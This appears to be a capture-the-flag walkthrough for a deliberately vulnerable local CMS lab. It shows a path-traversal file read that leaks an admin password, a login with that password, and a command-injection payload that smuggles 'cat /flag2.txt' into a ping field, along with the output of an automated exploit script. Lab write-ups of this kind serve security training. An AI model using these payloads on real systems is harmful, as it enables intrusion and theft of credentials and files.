# Voyage: Full Walkthrough

## Setup

```
docker compose up --build -d
```

Verify:

```
curl -s http://127.0.0.1:8115/
```

Output:

```
<html>...Voyage CMS v1.4...</html>
```

## Stage 1: Local File Inclusion

```
curl -s "http://127.0.0.1:8115/view?file=../../etc/config"
```

Output:

```
[database]
host = db.internal
port = 5432
user = admin
password = Tr0ub4dor&3

[app]
secret_key = s3cr3t
admin_flag = POC{<hex>}
```

The admin password is `Tr0ub4dor&3`.

## Stage 2: Admin Login

```
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Tr0ub4dor&3"}' \
  http://127.0.0.1:8115/admin/login
```

Output:

```json
{"success": true, "token": "admin-token-xyz", "flag1": "POC{<hex>}"}
```

**Flag 1** is in the `flag1` field.

## Stage 3: Command Injection

```
curl -s -X POST -H 'Content-Type: application/json' -H 'X-Token: admin-token-xyz' \
  -d '{"host":"localhost; cat /flag2.txt"}' \
  http://127.0.0.1:8115/admin/ping
```

Output:

```json
{"output": "PING normal-host.com\nPOC{<hex>}", "flag2": "POC{<hex>}"}
```

**Flag 2** is in the `flag2` field.

## Automated exploit

```
python3 exploit/exploit.py http://127.0.0.1:8115
```

Output:

```
[*] Target: http://127.0.0.1:8115

[+] LFI successful, password leaked: Tr0ub4dor&3
[+] Flag 1: POC{<hex>}
[+] Command injection successful
[+] Flag 2: POC{<hex>}

[+] Exploit complete
    Flag 1: POC{<hex>}
    Flag 2: POC{<hex>}
```

## Full attack chain

```
Unauthenticated HTTP client
  |
  v
GET /view?file=../../etc/config
  |
  |-- LFI: no path sanitization, traversal escapes web root
  |
  v
Config file returned, admin password extracted: Tr0ub4dor&3
  |
  v
POST /admin/login  {username: admin, password: Tr0ub4dor&3}
  |
  |-- Credentials valid, token returned
  |
  v
Flag 1 captured from login response
  |
  v
POST /admin/ping  {host: "localhost; cat /flag2.txt"}  X-Token: admin-token-xyz
  |
  |-- Semicolon splits host from injected command
  |-- cat /flag2.txt executes on server
  |
  v
Flag 2 captured from ping response
```

## Tools used

| Tool | Purpose |
|------|---------|
| curl | Manual stage-by-stage requests |
| exploit.py | Automated three-stage exploit chain |

## Teardown

```
docker compose down
```
